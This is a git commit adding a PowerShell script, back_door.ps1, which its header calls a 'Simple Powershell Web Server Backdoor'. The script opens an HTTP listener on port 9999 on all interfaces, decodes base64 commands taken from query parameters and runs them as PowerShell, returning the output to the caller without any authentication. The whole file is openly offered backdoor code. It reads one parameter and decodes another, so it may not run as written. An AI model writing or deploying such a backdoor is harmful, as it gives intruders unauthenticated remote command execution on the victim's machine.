ec3affe683079bd768bf79527836d72256b4ae73
chrisjd20 <chrisjd20@gmail.com>
2017-05-11 16:15:58 -0400

    Create back_door.ps1

---
+++ back_door.ps1
@@ -0,0 +1,48 @@
+#Simple Powershell Web Server Backdoor
+#Created by Chris Davis
+$Port = "9999"
+$Path = "backdoor/"
+$Url = "http://*:$Port/$Path"
+$listener = New-Object System.Net.HttpListener
+$listener.Prefixes.Add($Url)
+$listener.Start()
+try
+{
+  while ($listener.IsListening) {  
+    $context = $listener.GetContext()
+    $Request = $context.Request
+    $Response = $context.Response
+	$IPaddr = $Request.RemoteEndPoint.ToString().split('{:}')[0]
+	$usage = "Usage:`n`nhttp://"+$IPaddr+":"+$Port+"/"+$Path+"`?cmd=<Insert Your powershell compatible base64 encoded command here>"
+	try{
+		$command = $Request.QueryString.Item("cmd")
+		if ($command -eq "exit") {
+			Write-Verbose "Now Exiting"
+			return
+		} elseif ($command.length -eq 0) {
+			$html = $usage
+		} else {
+			$command =  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( $Request.QueryString.Item("command") ))
+			try {
+				$script = $ExecutionContext.InvokeCommand.NewScriptBlock($command)
+				$html = & $script
+				$Bytes = [System.Text.Encoding]::Unicode.GetBytes($html)
+				$html =[Convert]::ToBase64String($Bytes)
+			} catch {
+				$html = "Error Processing Command."
+				$statusCode = 500
+			}
+		}
+	} catch {
+		$html = $usage
+	}
+    $buffer = [Text.Encoding]::UTF8.GetBytes($html)
+    $Response.ContentLength64 = $buffer.length
+    $Response.OutputStream.Write($buffer, 0, $buffer.length)
+    $Response.Close()
+  }
+}
+finally
+{
+  $listener.Stop()
+}
